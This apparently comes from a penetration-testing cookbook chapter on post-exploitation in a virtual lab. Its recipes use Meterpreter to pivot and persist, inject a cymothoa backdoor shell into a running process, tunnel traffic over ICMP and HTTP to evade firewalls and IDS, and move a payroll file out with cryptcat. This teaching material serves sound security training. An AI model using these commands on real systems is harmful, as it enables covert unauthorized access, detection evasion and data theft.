<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Maintaining Access</h1>
                </header>
            
            <article>
                
<p>In this chapter, we will cover the following topics:</p>
<ul>
<li>Pivoting and expanding access to the network</li>
<li>Using persistence to maintain system access</li>
<li>Using cymothoa to create a Linux backdoor</li>
<li>Protocol spoofing using pingtunnel</li>
<li>Protocol spoofing using httptunnel</li>
<li>Hiding communications with cryptcat</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Introduction</h1>
                </header>
            
            <article>
                
<p><span>In this chapter, we will explore using multiple methods to maintain access. For best results, multiple hosts and multiple methodologies should be employed. We will also discuss how we cover our tracks to make it easier to hide our activity.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Pivoting and expanding access to the network</h1>
                </header>
            
            <article>
                
<p>In this recipe, we will leverage a host as a beachhead to exploit other hosts.</p>
<p>While this recipe may not sound appropriate for the topic of the chapter, one of the best ways of maintaining access to a target network is to have more hosts exploited that you can use for your communication channel. You can also have them use various forms of methods to reach out, so that if one is discovered you have access to others through different means. </p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Kali Linux VM is powered up and you are logged in as root</li>
<li>Your Windows XP VM is powered up on the host-only network</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>To complete this recipe, we will do the following:</p>
<ol>
<li>Validate the IP addresses of your machines before we get started.</li>
<li>We are going to start with an already exploited machine in Armitage.</li>
</ol>
<div class="packt_tip">We will be continuing from <a href="66009beb-61cd-46c3-9233-ec9b8edbf79c.xhtml" target="_blank">Chapter 7</a>, <em>Privilege Escalation</em> in recipe <em>Remotely bypassing Windows UAC</em>, if you need assistance getting started.</div>
<div class="CDPAlignCenter CDPAlign"><img height="547" width="671" class="alignnone size-full wp-image-1316 image-border" src="assets/c6445dd5-2981-4ab7-8c8f-6054d85a84f2.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - main screen</div>
<ol start="3">
<li>Right-click on the exploited windows XP machine and select <span class="packt_screen">Meterpreter</span> | <span class="packt_screen">Pivoting</span> | <span class="packt_screen">Setup</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="310" width="690" class="alignnone size-full wp-image-1317 image-border" src="assets/efdea3d2-cf9b-448b-8a45-dbf05c076707.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - main screen</div>
<ol start="4">
<li>Select <span class="packt_screen">Add Pivot</span> at the dialog box:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="175" width="208" class="alignnone size-medium wp-image-1177 image-border" src="assets/00a0d275-004e-4b2d-a1f2-cc3156a46f19.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - Add Pivot dialog</div>
<ol start="5">
<li>Upon success you will get a <span class="packt_screen">Route added</span> dialog box. Click on <span class="packt_screen">OK</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="102" width="159" class="alignnone size-medium wp-image-1178 image-border" src="assets/a0158727-8dcd-4324-95f6-0091fc52d1b0.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - Pivot success dialog</div>
<ol start="6">
<li>Now from the <kbd>msf &gt;</kbd> prompt, enter <kbd>route</kbd> and press <em>Enter</em><strong> </strong>and you will see our newly added route to the hosts on that subnet:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="445" width="542" class="alignnone size-full wp-image-1318 image-border" src="assets/4cd08aaa-f057-4f3b-943a-cc8abb5c2c0c.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - main screen</div>
<div class="packt_infobox">If this was a host compromised across a firewall or any other security boundary, I would now have the ability to launch attacks on other hosts on that subnet from Metasploit.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Using persistence to maintain system access</h1>
                </header>
            
            <article>
                
<p>In this recipe, we will use persistence to maintain access to the system across reboots.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Kali Linux VM is powered up and you are logged in as root</li>
<li>Your Windows XP VM is powered up on the host-only network</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>In this recipe we will use persistence methods to maintain access to a system:</p>
<ol>
<li>Validate the IP addresses of your machines before we get started.</li>
<li>We are going to start with an already exploited machine in Armitage, ensure it has elevated privileges.</li>
</ol>
<div class="packt_tip">We will be continuing with the preceding recipe if you need assistance with getting started. If you have not elevated your privileges please do so before continuing. If you are on XP, try using <kbd>ms15_051_client_copy_image</kbd>.</div>
<div class="CDPAlignCenter CDPAlign"><img height="499" width="612" class="alignnone size-full wp-image-1319 image-border" src="assets/31e20f88-6af6-4312-8a18-5cf8c325cfe9.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - main screen</div>
<ol start="3">
<li>Right-click on the exploited host and select <span class="packt_screen">Meterpreter</span> | <span class="packt_screen">Access</span> | <span class="packt_screen">Persist</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="511" width="625" class="alignnone size-full wp-image-1320 image-border" src="assets/963eb909-3b49-49ff-bd72-161920afd25d.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - main screen</div>
<ol start="4">
<li>Scroll through the options on the persistence screen ensuring your <span class="packt_screen">LHOST</span> and other options are correct and taking note of the <span class="packt_screen">LPORT</span>, click on <span class="packt_screen">Launch</span>: </li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="312" width="399" class="alignnone size-full wp-image-1321 image-border" src="assets/e04f84a3-950e-462b-a969-5c4db1747a03.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - persistence dialog</div>
<ol start="5">
<li>You will now see the exploit launch against the host. Once complete, you will see the following :</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="526" width="643" class="alignnone size-full wp-image-1322 image-border" src="assets/a7bfc23f-6e48-4b96-af4c-425b9cda4f59.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - main screen</div>
<ol start="6">
<li>Kill all your meterpreter jobs for the host by right-clicking on the host and selecting <span class="packt_screen">Meterpreter</span> | <span class="packt_screen">Kill</span>. Do this for each session. Also, close out all windows on the bottom except the console:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="545" width="670" class="alignnone size-full wp-image-1323 image-border" src="assets/479f1ecf-bdeb-42c7-8fd6-a0fd3aa0546c.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - main screen</div>
<ol start="7">
<li>Let's take a look at our jobs, from the console <kbd>msf &gt;</kbd> prompt, type <kbd>jobs</kbd> and press <em>Enter</em>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="547" width="671" class="alignnone size-full wp-image-1324 image-border" src="assets/b907f3aa-3c04-47f9-a546-ffb9da0843f5.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - main screen</div>
<ol start="8">
<li>Kill off any jobs that are not related to the <span class="packt_screen">LPORT</span> that was noted during <em>step 4</em>. In my case I will be killing job 1 by typing <kbd>kill 1</kbd><strong> </strong>and then pressing <em>Enter</em>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="246" width="653" class="alignnone size-full wp-image-1325 image-border" src="assets/056a9f4d-f3fe-4cb2-aedc-ea6d87c68d31.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - Console window</div>
<ol start="9">
<li>Now, shutdown the windows XP VM and wait a minute or two, then start it back up and log in as the same user.</li>
<li>You will now see that <span>the Windows VM has</span><span> reached back out and connected and we have a new meterpreter session available to work with:</span></li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="276" width="622" class="alignnone size-full wp-image-1326 image-border" src="assets/ab876f3d-8d8a-4809-bc3b-9948ea82704f.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage - main screen</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Using cymothoa to create a Linux backdoor</h1>
                </header>
            
            <article>
                
<p>In this recipe, we will use cymothoa to maintain Linux system access through the use of a backdoor.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Kali Linux VM is powered up and you are logged in as root</li>
<li>Your Metasploitable VM is powered up on the host-only network</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>To create a backdoor in Linux, we will use the following recipe:</p>
<ol>
<li>Validate the IP addresses of your machines before we get started.</li>
<li>In this case, we will be starting from a machine that has already been exploited; we will shortcut this exercise by accessing the Metasploitable machine through SSH.</li>
</ol>
<div class="packt_infobox">If you want, you can continue this recipe from <a href="66009beb-61cd-46c3-9233-ec9b8edbf79c.xhtml" target="_blank">Chapter 7</a>, <em>Privilege Escalation.</em></div>
<ol start="3">
<li>On your Kali machine start Armitage.</li>
<li>From Armitage, let's add the Metasploitable host if it is not already present. For this recipe, my Metasploitable machine is <kbd>192.168.56.101</kbd>. If required, scan<span>, nmap, and run the attack vectors against the Metasploitable device.</span></li>
</ol>
<div class="packt_infobox">See <a href="9f678d15-2115-4e29-a75d-03dba65d3398.xhtml" target="_blank">Chapter 4</a>, <em>Finding Exploits in the Target</em> for information on using Armitage.</div>
<ol start="5">
<li>Right-click on the Metasploitable machine and select <span class="packt_screen">Login</span> | <span class="packt_screen">ssh</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="288" width="654" class="alignnone size-full wp-image-1327 image-border" src="assets/f93435b4-1d13-4fe3-9ab3-c1b673391e0b.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage main screen</div>
<ol start="6">
<li>Enter the credentials for the Metasploitable machine <kbd>msfadmin</kbd>/<kbd>msfadmin</kbd> and select <span class="packt_screen">Launch</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="236" width="327" class="alignnone size-full wp-image-1328 image-border" src="assets/63e13fb2-f911-42a3-8cd4-35d063767e69.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage credentials dialog box</div>
<div>
<ol start="7">
<li>The machine icon will change to show it's compromised due to the fact that we have access. From here, right-click on the Metasploitable machine and select <span class="packt_screen">shell</span> | <span class="packt_screen">interact</span>.</li>
</ol>
</div>
<ol start="8">
<li>Open Firefox and download the following file to the Kali machine: <a href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/cymothoa-1-beta.tar.gz/download">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/cymothoa-1-beta.tar.gz/download</a>.</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="210" width="255" class="alignnone size-full wp-image-1329 image-border" src="assets/d3e6528f-b546-45d8-a778-3e7358fc974f.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Firefox save dialog box</div>
<ol start="9">
<li>From the Armitage shell screen, right-click and select <span class="packt_screen">Upload</span>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="245" width="656" class="alignnone size-full wp-image-1330 image-border" src="assets/7063371a-034b-44ca-b90d-7daab3249c9d.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage shell screen</div>
<ol start="10">
<li>Browse and select the <kbd>cymothoa-1-beta.tar.gz</kbd> and upload it to the Metasploitable VM:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="215" width="304" class="alignnone size-full wp-image-1331 image-border" src="assets/08f45c78-2395-4b69-94d3-51bf49a563be.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage file upload dialog box</div>
<ol start="11">
<li>From the shell screen in Armitage enter the following commands:</li>
</ol>
<pre style="padding-left: 60px"><strong>tar xvfz cymothoa-1-beta.tar.gz &lt;enter&gt;</strong><br/><strong>chmod +x cymothoa-1-beta -R &lt;enter&gt;</strong><br/><strong>cd cymothoa-1-beta &lt;enter&gt;</strong><br/><strong>make &lt;enter&gt;</strong><br/><strong>./cymothoa &lt;enter&gt;</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="242" width="646" class="alignnone size-full wp-image-1333 image-border" src="assets/e3673eae-2c99-4f42-b822-3ce42c476e5e.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage shell screen</div>
<ol start="12">
<li>Let's find a process to attach to by entering the following command:</li>
</ol>
<pre style="padding-left: 60px"><strong>ps -aux</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="478" width="554" class="alignnone size-full wp-image-1334 image-border" src="assets/1dca6590-6115-45fe-9ee0-ce27e0248ffc.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage full screen</div>
<ol start="13">
<li>Now let's attempt to attach to one of the processes we see here – make note of a PID value – a shell process is a good trial. In this case, we will use the PID <kbd>4720</kbd> and we will open a hole on port <kbd>4000</kbd> for a reverse connection:</li>
</ol>
<pre style="padding-left: 60px"><strong>./cymothoa -p 4720 -s 1 -y 4000</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="481" width="477" class="alignnone size-full wp-image-1335 image-border" src="assets/1307c16c-8531-4399-974a-a4947eedbbd8.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Armitage full screen</div>
<div class="packt_tip"><span>You may need to try several different Process IDs until you get a successful infection. If the worst comes to the worst,</span><span> login to the Metasploitable machine VM as the <kbd>msfadmin</kbd> user and then attach to that bash process.</span></div>
<ol start="14">
<li>Now from your Kali Linux machine open a terminal session and type the following:</li>
</ol>
<pre style="padding-left: 60px"><strong>cd &lt;enter&gt;</strong><br/><strong>nc 192.168.56.101 4000 &lt;enter&gt;</strong><br/><strong>ls &lt;enter&gt;</strong><br/><strong>whoami &lt;enter&gt;</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="355" width="473" class="alignnone size-full wp-image-1336 image-border" src="assets/b7a51566-0fdc-4d8a-a0ce-81fd8d1baf65.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Kali terminal window</div>
<div class="packt_infobox">Please note that you will not be receiving any terminal prompts from the sessions but you will be entering commands as the user that owned the <strong>process ID</strong> (<strong>PID</strong>). So if possible, work on the PID with high-level privileges such as those used by the root.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Protocol spoofing using pingtunnel</h1>
                </header>
            
            <article>
                
<p><span>In this recipe we will use pingtunnel to tunnel communications between two hosts. </span><span>As most of the time, ICMP communications are allowed through firewalls and rarely inspected for malicious traffic by most companies, it makes it easy to set up a connection that will largely go unnoticed.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Kali Linux VM is powered up and you are logged in as root</li>
<li>Your Ubuntu VM is powered up and you are logged in and on the NAT network and have internet connectivity</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>To tunnel communications through pingtunnel, we will follow this process:</p>
<ol>
<li>Validate the IP addresses of your Kali VM and your Ubuntu VM. For my purposes, my Kali box in <kbd>10.0.2.5</kbd> and Ubuntu is <kbd>10.0.2.6</kbd>.</li>
<li>First, we will start in the Ubuntu VM where we are currently logged in and we want to start by elevating ourselves to root by entering the following commands in the console:</li>
</ol>
<pre style="padding-left: 60px"><strong>sudo su &lt;enter&gt;</strong></pre>
<ol start="3">
<li>We will now install <kbd>ptunnel</kbd> on the Ubuntu VM with the following command:</li>
</ol>
<pre style="padding-left: 60px"><strong>apt install ptunnel &lt;enter&gt;</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="427" width="548" class="alignnone size-full wp-image-1337 image-border" src="assets/bf7a7c9a-fe17-4a51-8c89-6cd6148918d3.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Ubuntu console</div>
<ol start="4">
<li>Let's now start the tunnel on the Ubuntu machine:</li>
</ol>
<pre style="padding-left: 60px"><strong>ptunnel &lt;enter&gt;</strong></pre>
<ol start="5">
<li>Switch to the Kali machine, open a terminal window and enter the following command:</li>
</ol>
<pre style="padding-left: 60px"><strong>ptunnel -p 10.0.2.6 -lp -8022 -da localhost -dp 22 &lt;enter&gt;</strong></pre>
<ol start="6">
<li>Open a second terminal window on the Kali VM and enter the following, changing user <kbd>leonard</kbd> for a valid user on the Ubuntu machine.</li>
</ol>
<div class="packt_infobox">In the previous labs, we had setup a user of <kbd>Leonard</kbd> with a password of penny on the Ubuntu box.</div>
<pre style="padding-left: 60px"><strong>ssh leonard@10.0.2.5 -p 8022 &lt;enter&gt;</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="324" width="427" class="alignnone size-full wp-image-1338 image-border" src="assets/0ec51000-9090-49a7-936a-d269001800d8.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Kali terminal window - SSH connection</div>
<ol start="7">
<li>Let's look at the proxy window where we started <kbd>ptunnel</kbd> on the Kali VM and you will see it registering the incoming connection:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="86" width="475" class="alignnone size-full wp-image-1339 image-border" src="assets/184479cb-2521-4b5f-a5fd-63696c151422.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Kali terminal window - ptunnel</div>
<ol start="8">
<li>Lastly, let's take a look at the Ubuntu machine VM where the <kbd>ptunnel</kbd> proxy is:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="198" width="573" class="alignnone size-full wp-image-1340 image-border" src="assets/45ab9cc7-f49a-4468-a289-ee96f55c7aab.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Ubuntu terminal - ptunnel</div>
<div class="packt_infobox">Between the two machines all you will see if you are doing a tcpdump of the traffic will be ICMP traffic. This is a great way to make it through firewalls and IPS/IDS devices without being detected. You can also use this on a compromised host to use that as a jump host to target other computers.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Protocol spoofing using httptunnel</h1>
                </header>
            
            <article>
                
<p><span>In this recipe we will use <kbd>httptunnel</kbd> to tunnel communications between two hosts. </span><span>As most of the time, HTTP communications are allowed through firewalls with little inspection by most companies, it makes it easy to set up a connection that will largely go unnoticed.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Kali Linux VM is powered up and you are logged in as root</li>
<li>Your Ubuntu VM is powered up and you are logged in and on the NAT network and have internet connectivity</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>To create a tunnel with <kbd>httptunnel</kbd>, we will run through the following process:</p>
<ol>
<li>Validate the IP addresses of your Kali VM and your Ubuntu VM. For my purposes, my Kali box in <kbd>10.0.2.5</kbd> and Ubuntu is <kbd>10.0.2.6</kbd>.</li>
<li>First we will start in the Ubuntu VM where we are currently logged in and we want to start by elevating ourselves to the root by entering the following commands in the console:</li>
</ol>
<pre style="padding-left: 60px"><strong>sudo su &lt;enter&gt;</strong></pre>
<ol start="3">
<li>We will now install <kbd>httptunnel</kbd> on the Ubuntu VM with the following commands and prepare it for operation:</li>
</ol>
<pre style="padding-left: 60px"><strong>apt install httptunnel &lt;enter&gt;</strong><br/><strong>service apache2 stop &lt;enter&gt;</strong><br/><strong>hts -F localhost:22 80 &lt;enter&gt;</strong></pre>
<ol start="4">
<li>Switch over to the Kali VM and we will install, set up our client, and connect by entering the following commands:</li>
</ol>
<div class="packt_infobox"><span>In the previous labs, we had set up a user of <kbd>Leonard</kbd> with a password of penny on the Ubuntu box.</span></div>
<pre style="padding-left: 60px"><strong>apt install httptunnel &lt;enter&gt;</strong><br/><strong>htc -F 8022 10.0.2.6:80</strong><br/><strong>ssh leonard@10.0.2.5 -p 8022</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="359" width="445" class="alignnone size-full wp-image-1341 image-border" src="assets/3c65546c-734a-423a-86d3-240928955afa.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Kali terminal window</div>
<div class="packt_infobox">You will note that we are now logged into the remote Ubuntu box. If you were looking at this traffic you will see all traffic look like normal HTTP traffic. This is another useful way to get past firewalls and IPS/IDS devices to maintain your access to the network.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Hiding communications with cryptcat</h1>
                </header>
            
            <article>
                
<p><span>In this recipe we will use <kbd>cryptcat</kbd> to transfer files between two hosts. Although we will use <kbd>cryptcat</kbd> for transferring files in this example, it can be used for a wide variety of purposes such as secure chat, shell access, port scanning as well as others.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Let's ensure the following prerequisites:</p>
<ul>
<li>Your Kali Linux VM is powered up and you are logged in as root</li>
<li>Your Ubuntu VM is powered up and you are logged in and on the NAT network and have internet connectivity</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>To use <kbd>cryptcat</kbd> to create tunnels to hide communications, we will follow these steps:</p>
<ol>
<li>Validate the IP addresses of your Kali VM and your Ubuntu VM. For my purposes, my Kali box is <kbd>10.0.2.5</kbd> and Ubuntu are <kbd>10.0.2.6</kbd>.</li>
<li>First we will start in the Ubuntu VM where we are currently logged in and we want to start by elevating ourselves to root by entering the following commands in the console:</li>
</ol>
<pre style="padding-left: 60px"><strong>sudo su &lt;enter&gt;</strong></pre>
<ol start="3">
<li>We must next install <kbd>cryptcat</kbd> on the Ubuntu VM by entering the following command:</li>
</ol>
<pre style="padding-left: 60px"><strong>apt install cryptcat</strong></pre>
<ol start="4">
<li>From the Ubuntu machine we will enter the following commands to make an interesting file:</li>
</ol>
<pre style="padding-left: 60px"><strong>cd &lt;enter&gt;</strong><br/><strong>touch payroll.txt &lt;enter&gt;</strong><br/><strong>echo "john makes lots of money" &gt;&gt; payroll.txt &lt;enter&gt;</strong><br/><strong>cat payroll.txt &lt;enter&gt;</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="83" width="544" class="alignnone size-full wp-image-1342 image-border" src="assets/134446f6-75e3-4ee5-af65-e1ade9284406.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">ubuntu terminal window</div>
<ol start="5">
<li>Prepare to transfer the file through <kbd>cryptcat</kbd> by entering the following commands:</li>
</ol>
<pre style="padding-left: 60px"><strong>cryptcat -k password -v -l -p 8443 &lt; payroll.txt &lt;enter&gt;</strong></pre>
<ol start="6">
<li>Switch to the Kali box and let's retrieve and verify the file by opening a terminal window and entering the following commands:</li>
</ol>
<pre style="padding-left: 60px"><strong>cryptcat -k password -v 10.0.2.6 8443 &gt;&gt; payroll.txt &lt;enter&gt;</strong><br/><strong>&lt;ctrl&gt;-c</strong><br/><strong>cat payroll.txt</strong></pre>
<div class="CDPAlignCenter CDPAlign"><img height="334" width="455" class="alignnone size-full wp-image-1343 image-border" src="assets/c37851af-e62c-4af4-9a0a-79cfd5501259.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Kali terminal window</div>
<ol start="7">
<li>Let's take a look at the Ubuntu terminal to see what that shows:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img height="111" width="577" class="alignnone size-full wp-image-1344 image-border" src="assets/6621e0c9-a8d0-48d9-8983-124b701864cb.png"/></div>
<div class="packt_figref CDPAlignCenter CDPAlign">Ubuntu terminal</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>The <kbd>cryptcat</kbd> is effectively the same as netcat except for allowing encrypted communications through plain text. To get more information on the commands available to use, please refer to the <strong>netcat</strong> (<strong>nc</strong>) pages. With <kbd>cryptcat</kbd> they simply add an extra command line option of <kbd>-k &lt;password&gt;</kbd> where password is what is used to salt the password and create the secure communications.</p>
<p>Please review – <a href="https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf">https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf</a>.</p>


            </article>

            
        </section>
    </body></html>